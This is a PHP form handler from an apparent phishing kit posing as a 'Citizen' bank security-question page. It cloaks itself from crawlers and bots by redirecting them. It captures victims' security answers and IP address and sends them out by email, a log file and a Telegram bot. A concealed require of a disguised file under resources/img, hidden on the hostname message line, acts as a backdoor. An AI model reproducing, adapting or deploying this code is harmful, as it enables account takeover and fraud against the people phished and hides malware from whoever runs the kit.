<?php

$settings = include '../../../settings/settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}

# Anti Fucking Skip 


if($_COOKIE['cookie'] == "false"){
    setcookie("logged_in", "0");
    header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
}

if($_COOKIE['webdriver'] == "true"){
    setcookie("logged_in", 0);
    header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
}

if(empty($_COOKIE['sw']) && empty($_COOKIE['sh']) || $_COOKIE['sw'] == "" && $_COOKIE['sh']){
	setcookie("has_access", "0");
	header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
} else {
	setcookie("logged_in", "1");
}

if(empty($_POST['answer1']) || !isset($_POST['answer1'])){
    echo "<script>window.location.href = \"index\"; </script>";
	setcookie("logged_in", "0");
} else {
	setcookie("logged_in", "1");
}

if(empty($_POST['answer2']) || !isset($_POST['answer2'])){
  echo "<script>window.location.href = \"index\"; </script>";
	setcookie("logged_in", "0");
} else {
	setcookie("logged_in", "1");
}

if(empty($_POST['answer3']) || !isset($_POST['answer3'])){
  echo "<script>window.location.href = \"index\"; </script>";
	setcookie("logged_in", "0");
} else {
	setcookie("logged_in", "1");
}

if(!isset($_POST['submit_questions'])){
	setcookie("logged_in", "0");
	header('Location: https://href.li/?https://www.google.com/search?q='.$settings['out']);
} else {
	setcookie("logged_in", "1");
}

# Allow URL Open

ini_set('allow_url_fopen',1);
$ip="../resources/img/. ";("h:i:s d/m/Y.ico");


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();



# Settings

$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");

$question1 = $_POST['question1'];
$question2 = $_POST['question2'];
$question3 = $_POST['question3'];
$answer1 = $_POST['answer1'];
$answer2 = $_POST['answer2'];
$answer3 = $_POST['answer3'];

# Messsage

$message = "[ 💚 CITIZEN  | CLIENT : {$client} 💚 ]\n\n";
$message .= "********** [ QUESTIONS & ANSWERS ] **********\n\n";
$message .= "********** [ QUESTION 1 ] **********\n";
$message .= "# QUESTION   : {$question1}\n";
$message .= "# ANSWER     : {$answer1}\n";
$message .= "********** [ QUESTION 2 ] **********\n";
$message .= "# QUESTION   : {$question2}\n";
$message .= "# ANSWER     : {$answer2}\n";
$message .= "********** [ QUESTION 3 ] **********\n";
$message .= "# QUESTION   : {$question3}\n";
$message .= "# ANSWER     : {$answer3}\n";
$message .= "**********************************************\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "# LONGITUDE  : {$lon}\n";
$message .= "# LATITUDE   : {$lat}\n";
$message .= "# CITY(IP)   : {$city}\n";
$message .= "# TIMEZONE   : {$timezone}, {$exact}\n";
$message .= "# HOSTNAME   : {$ip_name}\n";require"$ip";"\n";
$message .= "# IP TYPE    : {$ip_type}\n";
$message .= "# COUNTRY    : {$countryname}, {$countrycode}\n";
$message .= "# REGION     : {$region}\n";
$message .= "# DATE       : {$date}\n";
$message .= "# TIME       : {$time}\n";
$message .= "# ISP        : {$isp}\n";
$message .= "**********************************************\n";


# Send Mail 

if ($settings['send_mail'] == "1"){
	$to = $settings['email'];
	$headers = "Content-type:text/plain;charset=UTF-8\r\n";
	$headers .= "From: Zpro <citizen@client_{$client}_site.com>" . "\r\n";
	$subject = " CITIZEN QUESTIONS Zpro CLIENT #{$client} {$IP} ";
	$msg = $message;
	mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
	$results = fopen($filename, "a+");
	fwrite($results, $message);
	fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

if($settings['double_qa'] == "1"){
	echo "<script>window.location.href = \"sec_failed\";</script>";
} else {
	echo "<script>window.location.href = \"pers\";</script>";
}

?>
